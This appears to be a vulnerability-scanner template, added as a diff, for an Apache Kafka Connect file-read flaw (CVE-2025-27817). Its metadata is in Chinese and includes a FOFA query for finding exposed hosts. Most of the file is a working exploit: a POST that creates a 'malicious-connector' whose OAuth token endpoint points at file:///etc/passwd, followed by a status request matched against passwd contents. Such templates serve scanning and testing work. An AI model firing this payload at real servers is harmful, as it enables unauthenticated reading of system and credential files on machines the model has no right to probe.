@@ -1,0 +1,53 @@
+id: Apache-Kafka-Connect-File-reading-CVE-2025-27817
+
+info:
+  name: "Apache Kafka Connect 未经验证输入导致文件系统访问漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="kafka_cluster_id"
+      Apache Kafka客户端在处理用户输入时缺乏严格的验证机制，攻击者可利用此缺陷通过构造恶意配置实现环境变量读取、磁盘文件访问以及非预期位置的请求转发，从而绕过预期的REST API访问控制策略。该漏洞允许远程攻击者在未认证状态下获取系统敏感信息或执行路径穿越操作。
+  reference:
+  - https://mp.weixin.qq.com/s/qT6QnKs0zejjlqVFmxJtpw
+  tags: Apache-Kafka,Apache-Kafka-Connect
+
+
+http:
+- raw:
+  - |
+    POST /connectors HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+    Content-Type: application/json
+
+    {
+    "name": "malicious-connector",
+    "config": {
+      "connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
+      "tasks.max": "1",
+      "source.cluster.alias": "source-0",
+      "target.cluster.alias": "target-0",
+      "source.cluster.bootstrap.servers": "127.0.0.1:9092",
+      "target.cluster.bootstrap.servers": "127.0.0.1:9092",
+      "producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd",
+      "producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginCallbackHandler",
+      "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required serviceName=\"exploit\";",
+      "producer.override.sasl.mechanism": "OAUTHBEARER",
+      "value.converter": "org.apache.kafka.connect.converters.ByteArrayConverter",
+      "key.converter": "org.apache.kafka.connect.converters.ByteArrayConverter"
+    }
+    } 
+  - |
+    GET /connectors/malicious-connector/status HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0'
+  - type: status
+    status:
+    - 200
